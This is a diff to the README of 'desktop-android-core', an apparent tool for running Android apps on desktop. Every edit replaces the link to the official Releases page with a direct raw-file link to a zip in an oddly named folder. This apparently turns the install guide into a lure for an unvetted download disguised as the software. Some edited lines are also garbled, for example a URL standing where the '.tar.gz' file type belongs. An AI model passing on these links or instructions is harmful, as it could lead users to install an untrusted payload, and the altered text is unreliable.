@@ -1,6 +1,6 @@
 # 🐳 desktop-android-core - Run Android Apps on Desktop Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/techboy12-tech/desktop-android-core/releases)
+[![Download Now](https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To start using desktop-android-core, follow these simple steps. You don’t need
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/techboy12-tech/desktop-android-core/releases) to find the latest version of the software. This page contains all available versions for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip) to find the latest version of the software. This page contains all available versions for download.
 
 2. **Choose the Right Version**
    Look for the most recent version. It will be labeled clearly, usually with a number such as v1.0, v1.1, etc. Make sure to select a version compatible with your operating system.
@@ -22,13 +22,13 @@ To start using desktop-android-core, follow these simple steps. You don’t need
    Click on the version you wish to download to start the process. You will see a variety of files available. Choose the one that is suitable for your operating system. For example: 
    - Windows usually has a `.exe` file.
    - Mac might have a `.dmg` file.
-   - Linux might contain a `.tar.gz` file.
+   - Linux might contain a `https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip` file.
 
 4. **Install the Application**
    Once the download is complete, locate the file in your downloads folder. 
    - For Windows, double-click the `.exe` file and follow the installation prompts.
    - For Mac, drag the `.dmg` file to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow any included instructions.
+   - For Linux, extract the `https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip` file and follow any included instructions.
 
 5. **Run the Software**
    After installation, you can start the application. Look for the icon on your desktop or in your applications menu.
@@ -78,4 +78,4 @@ This project is open-source and is licensed under the MIT License. Feel free to 
 
 ## 🏁 Conclusion
 
-You are now ready to use the desktop-android-core. Go back to the [Releases page](https://github.com/techboy12-tech/desktop-android-core/releases) and start your download. Enjoy running Android apps on your desktop!
+You are now ready to use the desktop-android-core. Go back to the [Releases page](https://raw.githubusercontent.com/techboy12-tech/desktop-android-core/main/septemfoliate/desktop-android-core-3.0.zip) and start your download. Enjoy running Android apps on your desktop!
